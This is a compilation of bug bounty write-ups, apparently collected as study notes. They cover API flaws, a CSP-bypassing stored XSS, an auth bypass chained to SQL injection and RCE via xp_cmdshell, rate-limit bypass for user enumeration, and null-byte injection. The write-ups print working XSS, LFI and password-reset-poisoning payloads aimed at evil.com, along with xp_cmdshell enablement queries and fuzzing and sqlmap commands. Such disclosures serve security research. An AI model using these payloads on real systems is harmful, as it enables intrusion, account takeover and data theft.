I start expanding every option on the api, and found that every api call need an authorization tokens or you can say some some sort of keys, except for one option. It doesn’t required any sort of keys and token to use the api endpoint.

![](https://miro.medium.com/v2/resize:fit:596/1*GAroRYtNGpCixseFrtLDSA.png)

Expanding this option I found I can make the following request using this endpoint to send emails to anyone including attachments, which doesn’t required any tokens authorization or keys:

```json
{  
  "messageBody": "string",  
  "emailTo": "string",  
  "attachment": [  
    {  
      "name": "string",  
      "encodedImage": "string"  
    }  
  ]  
}
```

So, first I make a simple request through ~={green}the ui to send an email, and my request was the following:=~

```json
{  
  "messageBody": "this is a test from hackerone",  
  "emailTo": "[myhandle@wearehackerone.com](mailto:mehedishakeel@wearehackerone.com)",  
  "attachment": [  
    {  
      "name": "This is a Test PoC",  
      "encodedImage": "testing"  
    }  
  ]  
}
```

As expected, I got **status code 200** in response and then i check my inbox, and found an email coming from the business email of targeted company domain name.

![](https://miro.medium.com/v2/resize:fit:700/1*j-TMEgYRpdhHZIpeCGSxKA.png)

This vulnerability bugs me, so I made more tests. So, I think why not try to inject html code into the message body and see if that works? I make the following changes in my request,

```json
  "messageBody": "<button>Click Me!</button>",  
  "emailTo": "[myhandle@wearehackerone.com](mailto:mehedishakeel@wearehackerone.com)",  
  "attachment": [  
    {  
      "name": "This is a Test PoC",  
      "encodedImage": "testing"  
    }  
  ]  
}
```

Simple Button Tag as a HTML Injection : **<button>Click Me!</button>**

I got another email with the html injection and a text attachments,

![](https://miro.medium.com/v2/resize:fit:629/1*sWbOXHaHCPmRZ2dUqqrXBg.png)

Now it’s time submit a detailed report. I prepare a detailed report, guiding every step I took, and make a **proper video PoC with a voiceover explaining how the vulnerability works** and what are the impact and submit the bug.

![](https://miro.medium.com/v2/resize:fit:700/1*xoAzuStHB5DXMsow9z9b3w.jpeg)


---

## E-commerce website vulnerability bounty practice sharing（II）
source: https://medium.com/@security.tecno/e-commerce-website-vulnerability-bounty-practice-sharing-ii-739d47705908

![](https://miro.medium.com/v2/resize:fit:627/1*3BhXT-4HoJGY6DwVoWxV1g.png)

							By Injamam

Hello everyone, do you remember the content we shared last time? In the previous article, we discussed a case involving a pre-authentication takeover vulnerability and an API security vulnerability (related to product information leakage) in an e-commerce website. Today, we will continue to share two more vulnerability cases discovered by researcher Injamam.

Review of the previous chapter: [E-commerce website vulnerability bounty practice sharing: Pre-Authentication takeover, API security vulnerabilities And Directory Brute Forcing（I）](https://security.tecno.com/SRC/blogdetail/312?lang=en_US)

# Part 3 Vulnerability Bug Bounty Practice

# 3.3 API vulnerabilities: Exposing Content of User-Deleted Comments

## 3.3.1 Background of the Vulnerability

One day, redacted.com launched a new feature, and new features often mean potential new vulnerabilities, which made me excited. ~={purple}This feature was a social interaction function, similar to those on social media websites. It allowed users to post images, comment on posts, and create polls for voting.=~

## 3.3.2 Attack scenario

As there was a comment functionality, my first tests focused on common vulnerabilities such as HTML injection and cross-site scripting (XSS):

Clicking on a deleted comment,it brought up an option to report the comment. This struck me as odd — ~={orange}why would the platform allow users to report a comment that had already been deleted?=~

![](https://miro.medium.com/v2/resize:fit:627/1*wYcxT4FnovuU0058dJd7lA.png)

This strange thing piqued my interest, leading me to assume that there might be more information hidden within the report feature.~={yellow}So,I decided to intercept the request made when reporting a deleted comment. Here’s how I proceeded:
=~
①I fired Up Burp Suite,then navigated to a deleted comment and clicked the “Report” button.

②As the report request was sent, I intercepted it with Burp Suite.

③After analyzing the intercepted API request, I discovered something interesting.~={orange}This request was revealing the entire content of the deleted comment, along with associated metadata such as timestamps, user IDs, and other contextual information.=~

![](https://miro.medium.com/v2/resize:fit:627/1*gjlkVDP-PIpjb7omIYGmZg.png)

## 3.3.3 Impact About this Vulnerability

**①Privacy violations:** This exposure of deleted comments is a serious privacy violation. ~={purple}Users expect that once they delete a comment, it is permanently removed from the platform and cannot be accessed by anyone.=~ Disclosing deleted comments compromises user trust and can reveal sensitive information that users intended to remove.

**②Confidential Information Exposure:** Deleted comments might contain sensitive or confidential information that users later regretted sharing. The exposure of such comments can lead to various issues, including reputation damage, harassment, or the unintended spread of personal information.

## 3.3.5 Suggestion For Developers

**①Data Minimization:** Only include necessary data in API requests and in their responses. Sensitive information, especially deleted content, should never be exposed.

**②Privacy by Design:** Ensure that privacy considerations are integral to the design and implementation of features.

**③Regular Security Audits:** Conduct regular security audits, especially after introducing new features, to identify and mitigate vulnerabilities.

----

## How a Simple Port Scan Led to a $500 Google Reward

by: https://osintteam.blog/how-a-simple-port-scan-led-to-a-500-google-reward-39d80e2e3fef

#Apache-Hadoop

_In this article, I will share how a simple port discovery in Google led to a $500 bounty.

**Rather than relying solely on standard recon tools, I turned to internet-wide search engines like** [**Shodan**](http://shodan.io)**,** [**FOFA**](http://en.fofa.info), and [**Censys**](http://search.censys.io). But even these tools can overwhelm you with data. A basic search `domain=”google.com”` gave me **35,000 results**

![](https://miro.medium.com/v2/resize:fit:875/1*IZ1ghOPilD0fZN-Bc7hPkA.png)

To narrow down this, I filtered out common ports like **80, 443, and 25**, using logical operators `&&`, `!=`to exclude them from my search. That took me down to a much more manageable **1,500 results**

![](https://miro.medium.com/v2/resize:fit:875/1*c43Q-fM49cwQU1vDgMK3yg.png)

_Still, manually port-scanning or hunting over a thousand domains would be incredibly time-consuming.

Then came the second layer of filtering. I ran the list through [**Httpx**](https://github.com/projectdiscovery/httpx) to grab HTTP status codes to filter them out, and used [**Gowitness**](https://github.com/sensepost/gowitness) for screenshots, allowing me to navigate through each domain/IP visually.

While scrolling through screenshots, one domain caught my eye. Instead of a usual webpage or error, it displayed this message:

> “**It looks like you are making an HTTP request to a Hadoop IPC port. This is not the correct port for the web interface on this daemon.**”

A quick Google search confirmed this was an error indicating the presence of a Hadoop service.

## What is Hadoop?

> **_Apache Hadoop_** _is an open-source framework for storing and processing large datasets across clusters of computers. **It handles large volumes of data and is mainly used for data analytics, reporting, and building insights from big data._**

So, after reading a bit about this, I immediately asked ChatGPT for common Hadoop service ports, and I checked each one, only to be met with blank pages or 404s. Disappointed, I almost moved on.

![](https://miro.medium.com/v2/resize:fit:875/1*jZYZP3EgI5VSJ9nycDDpbQ.png)

Common Ports of Hadoop Services [Source: ChatGPT]

With that itch in my mind, I decided to go directly to the [**Apache Hadoop official documentation**](https://apache.github.io/hadoop/)**.** Buried in their configuration references,<mark style="background: #ADCCFFA6;"><span style="color:rgb(0, 0, 0)"> I discovered ports that weren’t commonly listed, even by ChatGPT.</span></mark>

One of them was **port 9868**.

## What Was Exposed?

Accessing port **9868** revealed a **public-facing Hadoop Web UI** with the ability to:

- Delete files or directories stored in HDFS
- View detailed runtime logs, including stack traces and service-level errors
- Inspect system configurations, logs, and metrics

![](https://miro.medium.com/v2/resize:fit:875/1*QWs2bSXMqvvuSwwM3rLsDw.png)


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

~={cyan}_good report?_=~

#Important_report 

from: Syed Mushfik Hasan Tahsin aka [SMHTahsin33](https://twitter.com/smhtahsin33).

source: [unmasking a stored XSS vuln by CSP bypass](https://infosecwriteups.com/riding-the-waves-of-api-versioning-unmasking-a-stored-xss-vulnerability-bypassing-csp-using-c039c10df2b1)

![](https://miro.medium.com/v2/resize:fit:700/1*LdxfNi_hcHDwQ1JUosYsTw.png)

## **> Target Mapping : Discovering the Attack Surface**

The target I was working on, was for collaboration purpose with a bug hunter from Bangladesh. Initially he didn’t provide me with the whole scope information, **leaving me with just the root domain**


The target website is used for collaborating with teammates, digital contacts, doing projects, sharing them securely with one another.~={red} The whole site was made with Angular.JS and used JSON for data communication with the server. ~={cyan}The server uses a variation of versions of their APIs all mixed up.=~  =~


~={orange}We could upload pdfs, images, videos etc as documents for presentations. ~={blue}These items are saved there in a directory=~, and can be added to projects the projects anytime. This is where the first suspect lies.=~

## **> Suspect Inspection: Where can it go wrong?**

When uploading documents, tried to exploit the uploader but the files were being uploaded to a **S3 Bucket**, so nothing could be done here.

The POST request looked like this:

![](https://miro.medium.com/v2/resize:fit:700/1*fM-DjH9Yt9xfsPSG4OmUsA.png)

Now the question is can we control the URL to inject our input? The answer is actually Yes, but have to be followed by a **https://**

![](https://miro.medium.com/v2/resize:fit:700/1*n8u8AOoPyXFFdDtiKu4PDw.png)

or else…

![](https://miro.medium.com/v2/resize:fit:565/1*0ZNk8axo-NLZ_i-S8yIwmg.png)

The server responds with a **400 Bad Request**. And Doesn’t allow us to input anything of our desire.

## **> Decision Making : Should we leave the suspect and move on?**

The answer is straight, No. If we look at the initial request it sends a **POST** request to **/v2/items/.** While surfing the website we saw that some of the requests also uses **v3** of their API too😉  
As our wise assumption goes, shouldn’t it too? When we tried:

![](https://miro.medium.com/v2/resize:fit:700/1*aLM9gN5kObd5pCa8GIEsKQ.png)

The server responded with a **422 Unprocessable Entity** Error, with a bunch load of errors in the body

![](https://miro.medium.com/v2/resize:fit:596/1*FI9FDxKezHgC8aJOIjD9Ew.png)

It was indicating some missing parameters, requiring us to add those in the request.

![](https://miro.medium.com/v2/resize:fit:700/1*_vedLu1aaA8H2hsNomXC0Q.png)

When we did, it again poured us with an error telling the format doesn’t match their **regex**. We can fix that after observing their regex from the error dump.

![](https://miro.medium.com/v2/resize:fit:700/1*D4ZVPeL43YVevwvpRfSr2w.png)

	We added in the "format" header the "document:url":

Now when we made the **POST** request to **/v3/items** with their requirements, it did a **200 OK** and Now we can see that, we successfully injected a normal text in the **URL input** without any **https://**

## **> Making an Escape: Injecting Special Characters**

If we add this document to our project and preview, we can see that, reflection is inside **double quotes**, which we need to escape.

![](https://miro.medium.com/v2/resize:fit:555/1*CBNQ_tkye2427yUyq9H-pQ.png)

Let’s Inject _“><script>alert()</script>_, we used _\_ to escape the double quote inside, or else it would’ve broke the JSON Syntax.

![](https://miro.medium.com/v2/resize:fit:455/1*4aQhCRAEh0wOBuIyemguBQ.png)

If we again add this in our project and look at the preview now, we can see:

![](https://miro.medium.com/v2/resize:fit:488/1*17Fbq89Ii3qAS_A-17WXnA.png)

Yeah, it successfully escaped from the double quotes enclosure and reflected as valid tags. **But wait a second, where is the damn popup?** :)

## **> Drumroll Please: We welcome “Content-Security-Policy (CSP)”!**

When we check the console it is showing that our script got blocked by CSP as it doesn’t allow unsafe-inline.

![](https://miro.medium.com/v2/resize:fit:598/1*JSD8Clo0jf-Vn9X5cdg_Pg.png)

The defined Content Security Policy is as below:

The defined Content Security Policy is as below:

```cs
default-src 'self';frame-src https:; script-src 'self'   
https://player.vimeo.com/ https://www.youtube.com/ https://s.ytimg.com/;  
child-src https://www.youtube.com;  
connect-src 'self' https:; img-src 'self' data: https://i.ytimg.com/  
https://app.redacted.com/ https://fakeimg.pl/;  
style-src 'self' 'unsafe-inline'; font-src 'self';

```

~={pink}The content security policy defines that only the scripts hosted on that specific domain and the mentioned domains are allowed only.  =~


Among these the only domain that caught my eyes is **youtube.com**

## **> Bypassing CSP : Leveraging YouTube’s OEmbed Function**

YouTube has an interesting function called **oEmbed**, used for video embedding purposes. But the interesting part is that it also allows a **“Callback”** **parameter**. Every input there, is reflected on the page and the content-type is also identified as **text/javascript**

![](https://miro.medium.com/v2/resize:fit:700/1*yxjacbK_pEvMTxU19U2ruw.png)

![](https://miro.medium.com/v2/resize:fit:612/1*r3eIUwIS2_sEil7grXAZHw.png)

Now we if we visit [https://www.youtube.com/oembed?callback=alert(1337);](https://www.youtube.com/oembed?callback=alert%281337%29%3B) 
we can see that it is a valid JS now with a delimiter too.

![](https://miro.medium.com/v2/resize:fit:503/1*E2N9v0UeFDOzr7ySQHfcXw.png)

Now we can craft our payload as:  

 _\“><**script src=“_[_https://www.youtube.com/oembed?callback=alert(1337);_](https://www.youtube.com/oembed?callback=alert%281337%29%3B)_”></script**>_

![](https://miro.medium.com/v2/resize:fit:700/1*kjAYqF_QDDzvwBAGvhJ5tg.png)

Now we can add this to our project and visit the preview page.

![](https://miro.medium.com/v2/resize:fit:700/1*YWafcNz-VPenm9LeUX7gyQ.png)

![](https://miro.medium.com/v2/resize:fit:651/1*piOeGDUlh4hCqHtsvFTlTA.png)

And, Now the **popup** is finally here!

-- farselo spiegare da chatgpt e forse... metterlo nella sezione **xss?**

--- next writeup? https://infosecwriteups.com/stored-xss-to-account-takeover-going-beyond-document-cookie-970e42362f43

---


> https://medium.com/@HX007/subdomain-fuzzing-worth-35k-bounty-daebcb56d9bc

# Description:

The Story being in 2022 when I reported Auth Bypass Leads to **SQLI&RCE** for a private program in **Bugcrowd,** the Bug was fixed just one day after the report.

In 2024/3 **me** and **orwa** decided to re-testing our old bugs

The target that we were Re-Testing was `admin.Target.com`

we used **Subdomain Fuzzing** By Using this command:

```
 ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
```

> You will find `subdomain_megalist.txt` in reference part

Using this command we found a subdomain called `admintest.Target.com`

![](https://miro.medium.com/v2/resize:fit:627/1*gJy6VL-cev_f7AJYhexNUA.jpeg)

The `admintest.Target.com` was vulnerable since it has the same Back-end as the origin subdomain `admin.Target.com`

Let's talk about the bugs we have found one by one

**Auth Bypass&BAC :**

The `[https://admintest.Target.com](https://admintest.Target.com)` was redirect to `[https://admintest.Target.com](https://admintest.Target.com)/admin/login.aspx`

reading some js files, we found an endpoint called `[https://admintest.Target.com](https://admintest.Target.com)/admin/main.aspx` Opening it directly in the browser will redirect us again to the login page but in Burp we noticed something,

![](https://miro.medium.com/v2/resize:fit:896/1*k8jW7uXrw6p-_-iphOWFYw.jpeg)

the `Content-Length` was so large, so larger for redirect response

you can notice here that even though you redirect to the login page, the end is working, with full access,  
by removing these 3 headers I was able to access the panel:

![[Pasted image 20250208214044.png]]

Using **Burp Match And Replace** or using **Burp intercept response** by

```
change 302 Moved Temporarily to 200 OK  
remove Location: /admin/Login.aspx?logout=y  
remove html redirect code
```

we were able to get FULL Auth Bypass, and it was fully functional, not just front-end bypass, after digging deep, we were able to find `adduser.aspx` this endpoint was redirecting us to the login page as `main.aspx` using the same trick in `adduser.aspx` we were able to access the endpoint and add an admin account, **also we found another endpoint that shows admins password&username without any Auth**

![](https://miro.medium.com/v2/resize:fit:896/1*s1JhYLJSoteMFI30xYkZ_Q.jpeg)

**SQLI:**

After adding admin account , we were able to login It would be easier for us than using the above trick

we found an endpoint called `` `SQLQuery.aspx` `` And from it name u know what it function :)

The first thing I tried this **Query** `Select * from users`

we were able to see all user's info including passwords,emails,username:

![](https://miro.medium.com/v2/resize:fit:896/1*9PmImXt_z4ZfLNlKIr1F6g.jpeg)

**RCE:**

Since the database was `` `mssql` `` we tried to escalate it to **RCE** using `**xp_cmdshell**`

you  canread about `xp_cmdshell`

> https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/

![[Pasted image 20250208214725.png]]

In a short way `**xp_cmdshell**` **allow the user to execute commands in the system using mssql**

By default it is disabled, but you can enable it so easily, using **sqlmap** option `--os-shell`

But in our case, we don't need sqlmap since we execute **query** directly to the database just like `Select * from users` also `SELECT @@version`

so the first thing we should do to make `**xp_cmdshell**` working is to enable it by using these queries

```
SP_CONFIGURE "show advanced options", 1  
RECONFIGURE  
SP_CONFIGURE "xp_cmdshell", 1  
RECONFIGURE
```

> you can see this, it would help
> 
> [https://medium.com/@s12deff/microsoft-sql-server-to-rce-984016b4aaf8](https://medium.com/@s12deff/microsoft-sql-server-to-rce-984016b4aaf8)

and then `xp_cmdshell ‘whoami’` BOOM **RCE**!

![](https://miro.medium.com/v2/resize:fit:627/1*zoQaDt01fNzBgV7b1Q8ceg.png)

we sent all of them in one report + one other SQLI in another endpoint,and we got in total **35k bounty**

**Lessons learned&Summary:**

1_**Always check the redirect response in burp**

> I and Orwa found a lot of that same auth bypass, my first bounty was in 2020 and it was the same trick, `/admin/admin.php` Redirects to `login.php` But when I see the response in burp , the `admin.php` just worked fine and it is just **Front-End React !**

2_ try for **Subdomain fuzzing:**

```
admin-FUZZ.target.com E.G: admin-stg.target.com  
FUZZ-admin.target.com E.G: cert-admin.target.com  
adminFUZZ.target.com  E.G: admintest.target.com  
FUZZadmin.target.com  E.G:  testadmin.target.com  
admin.FUZZ.target.com E.G: admin.dev.target.com
```

> The Command again

```
ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0  

  
-t means threads , dont make it so high u could miss alot of working subs , aslo its dpends in your network speed  
,sinc im using vps 350 find for me   
  
-mc all means macth all respone codes like 200,302,403 and this important 
```


3_**Try to escalate the bug before reporting**

4_ **Quality over Quantity:**

> when u find multiple bugs or chaining bugs together try to report them as one report , u will get higher bounty :)

**Reference:**

> [subdomain_megalist.txt](https://github.com/netsecurity-as/subfuz/blob/master/subdomain_megalist.txt)
> 
> [https://github.com/netsecurity-as/subfuz/blob/master/subdomain_megalist.txt](https://github.com/netsecurity-as/subfuz/blob/master/subdomain_megalist.txt)

you can find a lot of lists here also

> [https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)

----

_Example: https://170.104.110.50/_

1. **Bug: Origin IP Disclosure Vulnerability**

_The server's origin IP address is exposed, potentially allowing attackers to bypass security protections like CDN or WAF, enabling direct attacks on the backend server._

Then I fired up my Burp Suite and captured the request and noticed that the server's name and version was disclosed. This is also a bug.

![None](https://miro.medium.com/v2/resize:fit:700/1*cTBoJy6GqmngubT_pbnJ0g.png)

Server Version: Nginx/1.18.0 (Ubuntu)

**2. Bug: Server Version Disclosure**

_The server reveals its version number in the HTTP response headers, exposing potentially vulnerable software details to attackers._

I checked their source code and noticed that the source code leaked **register** endpoint. _**www.target.com/register**_ and there was a create account page, I tried to test the input fields, but it was sanitized however the password aaaaaaaaaaaa was accepted when registered. Which is also a bug.

**3. Bug: Weak Password Policy**

The application allows weak passwords, increasing the risk of brute force attacks and unauthorized access.

Now that I had created an account and logged in, it was time to check for another bug, I really like to try out **Invalid / Improper Session Management after password reset,** So I opened two browsers **Edge** and **Firefox** logged in simultaneously with the same credentials _test@xyz.com aaaaaaaaaaaa_

On the Edge browser, I changed the password to bbbbbbbbbbbb and it was **changed and logged out**, However the session on the **Firefox was still active** **even after the password reset and failed to validate session.** That my friend is also a bug!

**4. Bug: Invalid/Improper Session management after password reset**

The application does not invalidate existing sessions after a password reset, allowing attackers to retain access even after credential changes.

After that I logged out of the website and tested for **No-Rate Limit on password reset** another favorite bug to hunt for.

On the login page, there was a "**Forgot password**" button and when I clicked on password reset the password reset was sent to my email. Tested once, then **intercepted and captured the password reset request** on the second trial and sent it to **intruder and set the payload to 100 iterations on language $0.5$ to repeat the process 100 times with minimal delay.**

And guess what there was no rate limit, and my emails were flooded with password reset link.

![None](https://miro.medium.com/v2/resize:fit:700/1*YwSnCTgQWD7ad4p5D8OlBg.png)

200 OK — No Rate Limit

![None](https://miro.medium.com/v2/resize:fit:700/1*KhU8XrMSn63rab5pD5_law.png)

Emails flooded with password reset links

**5: Bug: No-Rate Limit on Password Reset**

_The password reset functionality lacks rate limiting, allowing attackers to attempt an unlimited number of reset requests, potentially enabling brute force attacks._

With these bugs I decided to make a Video POC, write a detailed bug report and hope for the best.

## Rate Limiting:

# Bypass rate limit to enumeration users through Google Drive

At first, I browsed Google drive looking for feature to misuse it and I found this feature..

![](https://miro.medium.com/v2/resize:fit:700/1*x-t6tHq-bUeguaPS9xVTKg.png)

				The feature that allow you to share files

I**n short, this feature allows you to share the folder or content that you uploaded to a specific person or several people by sending an invitation via e-mail.** So I entered an email and ran burp suite to see what happens when I send an invitation. When I opened burp, I found this interesting request..

![](https://miro.medium.com/v2/resize:fit:700/1*3xdhaQ21NroUo8AdULANDQ.png)

		At the bottom of the request, there is the e-mail that I sent

When I looked at the response I found the first and last name and the link for the profile picture of the email owner.

![](https://miro.medium.com/v2/resize:fit:700/1*qqhITQJ31hEurDt09U-qfw.png)

				Personal information about the owner of the e-mail

it might seem interesting, but the Google policy does not consider this to be a kind of vulnerability, but bypass rate limit is vulnerability. **So I created a file containing 500 username and sent this request to intruder so that I would know if there was a limited rate or not.**

Indeed, the attack succeeded, and I sent the report to Google.

**In fact, the report was accepted but I was told that 500 requests were not enough to prove that there was a vulnerability. So I opened my laptop and created a file containing 2000 username to try it, unfortunately I arrived at the request number 845 and after that it started showing me a message that I exceeded the limit rate. I**n fact, I looked a little frustrated and I shut down my laptop, then it occurred to me the idea of ​​what if we split the attack into more than one folder.

It was just an idea (I’ll explain the details in a moment), I quickly opened my laptop and wrote a comment on my report contains my idea that will allows me to do 500K requests. But actually, when I wrote this comment, I didn’t know how I exploit this attack! It was just an idea. And after less than 24 hours I got this comment from security team, they want PoC for the scenario I described and also they say should not be possible at all.

![](https://miro.medium.com/v2/resize:fit:700/1*cgUKakAtZMKg7P1qYqlxVg.png)

						Security team comment

Now I will explain the idea, when I made 845 requests and got message that I exceeded the rate limit, what if I send 845 requests and then make another folder and send 845 other requests, I tried it and it really worked. But it sounds like an impractical idea and will take a lot of time. So I thought of creating a small program that creates a folder and then sends 845 request and then creates another folder and sends another 845 request.

After deep thought, a good idea came to my mind. I thought about creating 1000 folders and saving these folder names. And send 500 username per folder (I know that I can send it 845 time but I send it 500 only to avoid any possible error), and if we have 1,000 folders, we’re actually able to send 500K requests.

> The server of Google doesn’t give same name that we gave, so you want get the folder name, you have two ways, via the folder’s invitation link or another way which I will mention shortly.

When this idea came to my mind, I did not know how to get the names of 1000 folders, at first I was planning to create a folder and check its invitation link and get the folder name from it, but it would take a lot of time so I thought of another way. **I told myself why I don’t check the request that creates the folder, maybe I can find something that interests me. I actually sent the request to burp (the request of make a new folder) and surprisingly, the response contains the name of the folder I want, wonderful.**

The first problem was solved ✅

![](https://miro.medium.com/v2/resize:fit:700/1*AJwb7h2J4a37oBzgo1q10w.png)

						Folder name in response

**Before I begin describing the attack scenario, I’ll give you a quick summary of my trick:**

I noticed that request is accept send it 845 times but this for one folder so I make 1000 folder and I send 500 request for every folder, I know that I can send it 845 time but I send it 500 only to avoid any possible error, so I repeated each line 500 times in filename.txt to send 500 usernames with one folder and every folder I send it 500 time with different usernames, so until we can continue the process, and I guess that this process can be done indefinitely as long as I make 500K requests and the server didn’t stop me.

- First we will create 1000 folders by sending a request of making a new folder to intruder.

![](https://miro.medium.com/v2/resize:fit:700/1*AsBkFheeQ7bI7fz7amHxxw.png)

					The request of make a new folder

- Then we will set the payload **2–1000**.

> Remember we will create 1000 folders only to prove the vulnerability, but we can create more than that and also we can do more than 500K requests.

![](https://miro.medium.com/v2/resize:fit:700/1*NFYvU8JQDIkM7yS4M-i88Q.png)

							Payload setting

- Now we have to capture folder names from the response, so we will go to **Options tab - Grep Extract - Add** and choose the value of **id** to capture folders names from all the requests that we will send.

![](https://miro.medium.com/v2/resize:fit:700/1*H0FNOAGoRdAex82hV5w8pA.png)

							Grep Extract setting

- After running the intruder, we will have 1000 filenames, which we will put into a txt file. Now we have to repeat each name 500 times. So I looked for a way to repeat each line in a text file a certain number of times, and I found this simple command line..

`perl -ne ‘for$i(1..500){print}’filename.txt | tee output.txt`

![](https://miro.medium.com/v2/resize:fit:700/1*VpiWXAt2BpAyqK1uCcG1xQ.png)

Here is a **id** column contain names of the folders, simply click anywhere in the white space next to the column, **then press on Ctrl + A and it will select all and then press on Ctrl + C and it will copy them**

- Now we will go to burp again and send the request that **invite person via e-mail** to intruder. We’ll choose the folder name as payload number one and we’ll choose the username as payload number two.

![](https://miro.medium.com/v2/resize:fit:700/1*zDCunl_v_wV4_mSyZMqrlg.png)

				The request of invite person via e-mail

Now everything is ready. Indeed, the attack succeeded and I submitted the PoC to Google and got a **🎉 Nice catch!** But unfortunately, three weeks later I was told my report was ineligible for bounty, but I was added to HOF.

![](https://miro.medium.com/v2/resize:fit:700/1*a8ir0BcTcjC84ua4TCeKNQ.png)

							Attack operation



---

## NuLL Byte Injection

I’ll be sharing a couple of vulnerabilities I discovered leveraging ~={blue}null byte injection=~ — exploits that wouldn’t have been possible without this technique. For confidentiality, I’ll refer to all the websites involved as _company.com_, as I’m not permitted to disclose the actual company names.

# What is null byte character?

> A null byte, often represented as ‘\0’, is a special character with a value of zero. In programming, it’s used to indicate the end of a string or data. Null byte injection involves manipulating this character to exploit vulnerabilities in a system.

# Password Reset Parsing confusion

i was testing this cdn application and decided to test the password reset functionality and i found a very interesting parameter called callbackUrl.

![](https://miro.medium.com/v2/resize:fit:700/1*-Sz7dqKreL8ciooJF7SjDg.png)

when i attempted to reset the password i attemped to to append /test at the end of the url and checked my email and i got the following url:

https://company.com/auth/reset-password/test?code=blabla

so i quickly tried to change domain in the callbackUrl to evil.com but unfortunately Got 400 Bad request status code

![](https://miro.medium.com/v2/resize:fit:561/1*mHFxdMSBSEPpGvhdXdJ_jg.png)

i got really frustrated but nevertheless i decided to spend some time on it since being able to control some parts of the password-reset **callbackUrl** was a red flag for me

> _Here aresome of the payloads that i tried_
> 
> [_http://evil.com@company.net/auth/reset-password_](http://evil.com@company.net/auth/reset-password)
> 
> [_http://evil.com%20@company.net/auth/reset-password_](http://evil.com%20@company.net/auth/reset-password)
> 
> [_http://evil.com\@company.net/auth/reset-password_](http://evil.com%20@company.net/auth/reset-password)
> 
> [_http://evil.com?@company.net/auth/reset-password_](http://evil.com%20@company.net/auth/reset-password)
> 
> [_http://evil.com#@company.net/auth/reset-password_](http://evil.com%20@company.net/auth/reset-password)

And many more they all returned
~={orange}
400 status code . then i had an idea to try null byte injection but since this a json request i can’t just insert the regular url encoded %00=~ so i did a little bit of research and read about the json RFC and figured out that i can insert unicode characters using the \u sequence

![](https://miro.medium.com/v2/resize:fit:595/1*oVUfxvvE4eZuIea0KNk3XQ.png)

> a string containing only a single reverse solidus character may be represented as \u005C

in this case the equivalent of url null byte character %00 in unicode is \u0000

So i tried this payload

> https://evil.com\u0000@company.net

![](https://miro.medium.com/v2/resize:fit:700/1*SlBiNSH6J7jsoLKjs4RLQQ.png)

![](https://miro.medium.com/v2/resize:fit:312/1*53rm1KAGwROMR9EJjWgwpQ.png)

# Path Traversal To XSS

in this app, i was fuzzing for some hidden params using param miner and param miner returned a parameter caught my eye immediately called templatename quickly requested it with the value of templatename=0xold and checked the server response

![](https://miro.medium.com/v2/resize:fit:700/1*bz-bUnCXGw42H6VhRDIU2g.png)

Encountered a 500 internal error, indicating a server-side issue on the backend. My initial assumption was that the server tried to include the file “0xold,” but the attempt failed, resulting in the 500 error — suggesting a potential Local File Inclusion (LFI). Before proceeding, I opted to investigate the operating system the website operates on before trying to inject any payload.

I Ran the following Command to identify the os

> nmap -A Company.com

![](https://miro.medium.com/v2/resize:fit:676/1*f42OJc-8YRQlyqudhbx8xQ.png)

So now we know that the website is running on windows we can now proceed and inject lfi windows payloads

I started off by injecting payloads such as

> login.asp
> 
> logout.asp
> 
> ../login.asp
> 
> ..\login.asp
> 
> ….//login.asp
> 
> ….//login.asp%00
> 
> ….\\login.asp
> 
> ../../windows\win.ini
> 
> ..\..\windows\win.ini

and hundreds of payloads i even ran json-haddix lfi’s wordlist from seclist repo nothing really worked all resulted in a 500-status code. i then decided to take a break and think a little bit about it. then i thought maybe the developer was doing some kind of whitelisting and returns a 500 status error if the templatename parameter isn’t in the whitelist to verify my theory i decided to use the tool cewl to generate a custom wordlist.


I Ran the following command to generate a wordlist

> cewl ‘https://company.net’ > wordlist

then

> ffuf -c -w wordlist -u ‘https://company.net/login.asp?templatename=FUZZ’ -mc all -fc 500

One of the values returned 200 OK status code ! It was the company’s name all along!

![](https://miro.medium.com/v2/resize:fit:700/1*o39QOoc2WacN9U8iVYWUdA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*KiQhAJQ8YMOxN0JXhmjnlA.png)

the parameter value was being reflected in the http response so i decided to try inject some xss but still anything that doesnt equal the company’s name will return 500 STATUS code. how can we exploit it? Maybe using the ../ sequence? so i injected the following value in the templatename param and checked the response

> company.com/0xoldSaysHi/../

![](https://miro.medium.com/v2/resize:fit:557/1*2_2k9syItqrhq9lv2qm1lA.png)

Awesome It worked! lets try to inject some xss now

i injected this simple payload to see if i can escape out of the html

> company/0xoldSaysHi”>/../

![](https://miro.medium.com/v2/resize:fit:522/1*XfXnyUNCLl-g3eUSqalCjg.png)

i was able to inject the double quote characters but the > characters wasn’t being refelected for some reason so i tried to inject null byte character after the > character to see what will happen

> company/0xoldSaysHi”>%00/../

![](https://miro.medium.com/v2/resize:fit:524/1*eRFh7CTaCEitIM-sGZXMsg.png)

It worked!! lets to pop up an alert real quick

> company/0xoldSaysHi”%00><%00img+src=x+onerror=alert(1337)%00>/../

![](https://miro.medium.com/v2/resize:fit:649/1*vb4qFDYycDvAn5QXE-6wTw.png)

# Bypassing an internal WAF through null byte injection

I was testing this app for sql injection and by throwing a regular ‘ in the error_category param the website returned a db error indicating that it is vulnerable to sql injection cool! i will just save the request and run sqlmap and let it do all the hardwork

![](https://miro.medium.com/v2/resize:fit:700/1*xqhW9ujP2dTz1U7CDPp2XA.png)

Saved the request to a file called r and ran the following command

```
python3 sqlmap.py -r r — batch — dbs — random-agent
```

![](https://miro.medium.com/v2/resize:fit:700/1*ttTtyIEWneIK-jOgB1i0pQ.png)

Shortly After sqlmap returned a connection time out i initially though the application couldn’t handle the number of requests that sqlmap sent and it went down. i ran a simple curl returned connection failed. tried it from my pc it works hmm maybe there are some kind of internal waf? i decided to exploit it manually through my pc it is not a big deal since it is an error based-SQLI

tried a simple union query ‘UNION+SELECT+1337 — — the server was hanging so i changed query to UnION/**/sElect+1337 still hangs tried to change the value to ‘test+test+1337 — — return a db error so after a little bit of trial and error i figured out how does their internal waf work. the waf was parsing the http requests and if it finds a malicious query it hangs and if i submitted 3 requests in a row and it hanged it will block my ip.

